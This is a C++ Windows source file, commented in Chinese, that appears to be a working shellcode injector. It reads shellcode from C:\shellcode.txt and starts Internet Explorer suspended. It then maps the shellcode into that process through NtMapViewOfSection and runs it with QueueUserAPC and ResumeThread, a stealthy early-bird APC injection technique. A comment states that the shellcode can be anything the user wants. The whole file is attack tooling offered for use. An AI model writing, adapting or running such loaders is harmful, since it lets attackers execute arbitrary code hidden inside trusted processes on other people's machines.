// HideInject.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <windows.h>  

typedef LONG NTSTATUS, *PNTSTATUS;  
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)  

typedef enum _SECTION_INHERIT   
{  
	ViewShare = 1,  
	ViewUnmap = 2  
} SECTION_INHERIT;  

typedef NTSTATUS (__stdcall *func_NtMapViewOfSection) ( HANDLE, HANDLE, LPVOID, ULONG, SIZE_T, LARGE_INTEGER*, SIZE_T*, SECTION_INHERIT, ULONG, ULONG );  

func_NtMapViewOfSection NtMapViewOfSection = NULL;  


LPVOID NTAPI MyMapViewOfFileEx( HANDLE hProcess, HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow,   
							   DWORD dwNumberOfBytesToMap, LPVOID lpBaseAddress )    
{  
	NTSTATUS Status;  
	LARGE_INTEGER SectionOffset;  
	ULONG ViewSize;  
	ULONG Protect;  
	LPVOID ViewBase;  


	// 转换偏移量  
	SectionOffset.LowPart = dwFileOffsetLow;  
	SectionOffset.HighPart = dwFileOffsetHigh;  

	// 保存大小和起始地址  
	ViewBase = lpBaseAddress;  
	ViewSize = dwNumberOfBytesToMap;  

	// 转换标志为NT保护属性  
	if (dwDesiredAccess & FILE_MAP_WRITE)  
	{  
		Protect = PAGE_READWRITE;  
	}  
	else if (dwDesiredAccess & FILE_MAP_READ)  
	{  
		Protect = PAGE_READONLY;  
	}  
	else if (dwDesiredAccess & FILE_MAP_COPY)  
	{  
		Protect = PAGE_WRITECOPY;  
	}  
	else  
	{  
		Protect = PAGE_NOACCESS;  
	}  

	//映射区段  
	Status = NtMapViewOfSection(hFileMappingObject,  
		hProcess,  
		&ViewBase,  
		0,  
		0,  
		&SectionOffset,  
		&ViewSize,  
		ViewShare,  
		0,  
		Protect);  
	if (!NT_SUCCESS(Status))  
	{  
		// 失败  
		return NULL;  
	}  

	//返回起始地址  
	return ViewBase;  
}  


int _tmain(int argc, _TCHAR* argv[])
{
	HMODULE hDll = LoadLibrary( "ntdll.dll" );  

	NtMapViewOfSection = (func_NtMapViewOfSection) GetProcAddress (hDll, "NtMapViewOfSection");  

	// 取ShellCode,任何你想实现的  
	HANDLE hFile = CreateFile ("C:\\shellcode.txt", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);  

	HANDLE hMappedFile = CreateFileMapping (hFile, NULL, PAGE_READONLY, 0, 0, NULL);  

	// 启动目标进程  
	STARTUPINFO st;   
	ZeroMemory (&st, sizeof(st));  
	st.cb = sizeof (STARTUPINFO);  

	PROCESS_INFORMATION pi;  
	ZeroMemory (&pi, sizeof(pi));  

	CreateProcess ("C:\\Programme\\Internet Explorer\\iexplore.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &st, &pi);  


	// 注入shellcode到目标进程地址空间  
	LPVOID MappedFile = MyMapViewOfFileEx (pi.hProcess, hMappedFile, FILE_MAP_READ, 0, 0, 0, NULL);  

	// 创建一个新的能够在目标线程恢复是首先执行的APC  
	QueueUserAPC ((PAPCFUNC) MappedFile, pi.hThread, NULL);  
	ResumeThread (pi.hThread);  
	CloseHandle (hFile);  
	CloseHandle (hMappedFile);  
	CloseHandle (pi.hThread);  
	CloseHandle (pi.hProcess);  
	return 0;
	return 0;
}

